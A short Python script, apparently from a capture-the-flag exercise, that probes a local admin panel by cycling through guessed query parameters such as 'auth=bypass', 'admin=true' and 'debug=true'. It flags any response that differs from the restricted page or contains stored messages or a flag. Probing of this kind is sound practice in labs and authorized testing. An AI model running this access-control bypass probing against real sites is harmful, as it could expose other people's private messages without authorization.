import requests
import json

url = "http://127.0.0.1:32832/admin/"
headers = {"User-Agent": "Mozilla/5.0"}

# Common admin panel parameters to test for revealing stored messages
params_to_test = [
    {"page": "messages"},
    {"view": "all"},
    {"show": "contacts"},
    {"section": "messages"},
    {"mode": "admin"},
    {"debug": "true"},
    {"auth": "bypass"},
    {"id": "1"},
    {"message_id": "1"},
    {"user": "admin"},
    {"action": "view"},
    {"type": "contacts"},
    {"panel": "messages"},
    {"admin": "true"},
    {"view": "messages"}
]

results = []
for params in params_to_test:
    try:
        response = requests.get(url, params=params, headers=headers, timeout=5)
        content = response.text
        
        # Check if response is different from default "Restricted" page
        is_default = "Restricted" in content and content.count("<li>") == 4
        
        # Look for stored message indicators
        has_messages = any(x in content.lower() for x in ["message", "contact", "email", "name", "text"])
        has_table = "<table" in content.lower()
        has_form = "<form" in content.lower()
        has_flag = "FLAG{" in content
        
        results.append({
            "params": params,
            "status": response.status_code,
            "is_default": is_default,
            "has_messages": has_messages,
            "has_table": has_table,
            "has_form": has_form,
            "has_flag": has_flag,
            "length": len(content)
        })
        
        # If we find something interesting, print the content
        if not is_default or has_messages or has_table or has_form or has_flag:
            print(f"\n=== Interesting response with params {params} ===")
            print(f"Status: {response.status_code}")
            print(f"Length: {len(content)}")
            print(f"Content preview: {content[:500]}")
            if has_flag:
                print(f"FLAG FOUND: {content}")
    except Exception as e:
        results.append({"params": params, "error": str(e)})

print("\n=== Summary of all parameter tests ===")
for r in results:
    print(json.dumps(r))
